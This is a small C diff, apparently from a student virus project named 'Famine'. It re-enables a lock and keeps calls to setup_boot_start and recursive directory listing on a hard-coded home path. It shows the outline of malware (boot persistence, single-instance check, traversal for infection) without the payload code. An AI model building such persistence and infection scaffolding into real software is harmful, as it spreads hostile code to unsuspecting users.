@@ -49,6 +49,7 @@ int lock_global(void) {
         DBG("ALREADY LOCKED\n");
         close(fd);
         exit(0);
+
     }
 
     return fd;
@@ -58,7 +59,8 @@ int main(void) {
     set_log_level(L_DEBUG);
     DBG("[FAMINE START]\n");
     
-    // int lock_fd = lock_global();
+    int lock_fd = lock_global();
+
     pid_t pid = fork();
 
     if (pid == 0) {
@@ -67,11 +69,12 @@ int main(void) {
         }
         setup_boot_start();
         exit_if_process_running();
-        list_recursive(TMPTEST_PATH);
+        list_recursive("/home/kurt/Famine");
         list_recursive(TMPTEST2_PATH);
+        close(lock_fd);
     }
 
-    // close(lock_fd);
+    close(lock_fd);
     wait(NULL);
     return (0);
 }
